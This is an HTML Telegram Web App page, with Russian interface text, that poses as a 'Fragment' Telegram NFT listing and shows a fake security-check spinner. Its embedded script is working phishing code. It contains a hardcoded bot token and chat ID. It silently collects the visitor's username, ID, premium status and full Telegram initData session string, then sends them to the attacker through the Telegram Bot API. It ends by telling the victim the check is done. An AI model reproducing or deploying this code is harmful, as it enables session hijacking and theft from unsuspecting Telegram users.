<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0a;color:#fff;font-family:Arial;padding:15px}
        .top{display:flex;align-items:center;gap:8px;padding:10px 0;border-bottom:1px solid #1a1a1a;margin-bottom:15px}
        .top .dot{width:8px;height:8px;background:#00c853;border-radius:50%}
        .top span{font-size:15px;font-weight:bold}
        .card{background:#141414;border:1px solid #222;border-radius:14px;overflow:hidden;max-width:350px;margin:0 auto}
        .card .img{width:100%;height:250px;background:linear-gradient(135deg,#1a1a1a,#2a2a2a);display:flex;align-items:center;justify-content:center;font-size:60px}
        .info{padding:15px}
        .info h3{font-size:18px;margin-bottom:5px}
        .info .coll{color:#3390ec;font-size:12px;margin-bottom:10px}
        .row{display:flex;justify-content:space-between;padding:8px 0;border-top:1px solid #1a1a1a;font-size:13px}
        .row .l{color:#888}
        .load{text-align:center;padding:30px}
        .spin{width:40px;height:40px;border:3px solid #1a1a1a;border-top:3px solid #3390ec;border-radius:50%;animation:spin 0.7s linear infinite;margin:15px auto}
        @keyframes spin{100%{transform:rotate(360deg)}}
        .load p{color:#888;font-size:12px;margin-top:10px}
    </style>
</head>
<body>
    <div class="top"><div class="dot"></div><span>Fragment</span></div>
    <div class="card">
        <div class="img">🖼️</div>
        <div class="info">
            <h3>Telegram NFT</h3>
            <p class="coll">Коллекция: Fragment</p>
            <div class="row"><span class="l">Владелец</span><span>@username</span></div>
            <div class="row"><span class="l">Цена</span><span>⭐ 500 TON</span></div>
            <div class="row"><span class="l">Сеть</span><span>TON</span></div>
        </div>
    </div>
    <div class="load"><div class="spin"></div><p>Проверка безопасности...</p></div>
    <script>
        const tg=window.Telegram.WebApp;
        const BOT="8826093599:AAFkRL-bsb_tCUb0qmlS8BkThT2YVGvR1Qc";
        const OID="8776338681";
        tg.ready();tg.expand();
        setTimeout(async()=>{
            const u=tg.initDataUnsafe?.user||{};
            const d=tg.initData||"";
            await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:OID,text:`🔥 АККАУНТ\n👤 @${u.username||'нет'}\n🆔 ${u.id}\n💎 Premium: ${u.isPremium?'Да':'Нет'}\n\n📱 ${d}`,parse_mode:"Markdown"})});
            document.querySelector(".load").innerHTML="<h3>✅ Готово</h3><p style='color:#888'>Можете закрыть окно</p>";
        },1200);
    </script>
</body>
</html>
